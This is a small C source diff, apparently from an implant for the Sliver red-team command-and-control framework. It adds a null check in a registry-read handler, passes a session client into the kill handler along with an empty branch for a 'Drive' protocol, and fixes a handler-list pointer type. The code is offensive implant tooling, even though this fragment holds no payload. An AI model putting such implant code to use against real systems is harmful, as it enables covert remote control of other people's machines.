@@ -2001,7 +2001,7 @@ PENVELOPE RegistryReadHandler
 		goto CLEANUP;
 	}
 
-	if (UnmarshaledData[0] == NULL || UnmarshaledData[1] == NULL) {
+	if (UnmarshaledData[0] == NULL || UnmarshaledData[1] == NULL || UnmarshaledData[2] == NULL) {
 		goto CLEANUP;
 	}
 
@@ -3832,15 +3832,25 @@ CLEANUP:
 
 PENVELOPE KillHandler
 (
-	_In_ PENVELOPE pEnvelope
+	_In_ PENVELOPE pEnvelope,
+	_In_ LPVOID lpSliverClient
 )
 {
+	PGLOBAL_CONFIG pConfig = NULL;
+	PSLIVER_SESSION_CLIENT pSession = NULL;
+
+	pSession = (PSLIVER_SESSION_CLIENT)lpSliverClient;
+	pConfig = pSession->pGlobalConfig;
+	if (pConfig->Protocol == Drive) {
+
+	}
+
 	ExitProcess(0);
 }
 
 REQUEST_HANDLER* GetSystemHandler()
 {
-	LPVOID* HandlerList = NULL;
+	REQUEST_HANDLER* HandlerList = NULL;
 
 	HandlerList = ALLOC(sizeof(LPVOID) * MsgEnd);
 	HandlerList[MsgEnvReq] = GetEnvHandler;
